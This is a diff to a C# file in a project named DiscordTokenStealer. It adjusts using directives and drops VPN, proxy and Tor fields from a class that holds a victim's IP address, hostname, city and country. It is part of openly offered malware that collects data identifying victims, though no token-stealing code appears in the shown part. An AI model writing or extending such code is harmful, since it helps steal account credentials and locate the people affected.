@@ -1,7 +1,13 @@
-﻿using System.Net;
-using System.Net.Sockets;
+﻿using System;
+using System.IO;
+using System.Net;
+using System.Linq;
+using System.Net.Http;
 using System.Text.Json;
+using System.Net.Sockets;
+using System.Threading.Tasks;
 using System.Text.Json.Serialization;
+#pragma warning disable 8618
 
 namespace DiscordTokenStealer
 {
@@ -27,20 +33,13 @@ namespace DiscordTokenStealer
             return (await Dns.GetHostEntryAsync(Dns.GetHostName())).AddressList.FirstOrDefault(address =>
                 address.AddressFamily == AddressFamily.InterNetworkV6);
         }
-
+        
         public class IPInformation
         {
             [JsonPropertyName("ip")] public string IP { get; set; }
             [JsonPropertyName("hostname")] public string Hostname { get; set; }
             [JsonPropertyName("city")] public string City { get; set; }
             [JsonPropertyName("country")] public string Country { get; set; }
-            [JsonPropertyName("privacy")] public PrivacyJson Privacy { get; set; }
-            public class PrivacyJson
-            {
-                [JsonPropertyName("vpn")] public bool VPN { get; set; }
-                [JsonPropertyName("proxy")] public bool Proxy { get; set; }
-                [JsonPropertyName("tor")] public bool Tor { get; set; }
-            }
         }
     }
 }
